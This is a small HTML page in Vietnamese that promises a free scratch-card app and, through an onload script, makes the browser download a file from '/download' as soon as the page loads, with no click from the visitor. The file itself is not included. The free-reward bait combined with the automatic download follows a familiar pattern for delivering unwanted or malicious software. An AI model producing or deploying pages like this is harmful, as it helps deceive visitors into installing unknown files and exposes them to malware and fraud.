<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Download app free</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }

        .rainbow-text {
            font-size: 28px;
            font-weight: bold;
            background: linear-gradient(
                -45deg,
                red,
                orange,
                yellow,
                green,
                blue,
                indigo,
                violet,
                red
            );
            background-size: 400% 400%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: rainbow 5s linear infinite;
        }

        @keyframes rainbow {
            0% { background-position: 0% 50%; }
            100% { background-position: 100% 50%; }
        }
    </style>
</head>
<body>
    <h1 class="rainbow-text">App nhận thẻ cào free tùy chọn</h1>
    <h5 class="rainbow-text">Đang tải app... vui lòng chờ 1s!</h5>

    <script>
        // Tự động tải sau khi trang load
        window.onload = function() {
            const link = document.createElement('a');
            link.href = '/download'; // <-- Đường dẫn đến file cần tải
            link.download = ''; // Cho phép tải
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        };
    </script>
</body>
</html>
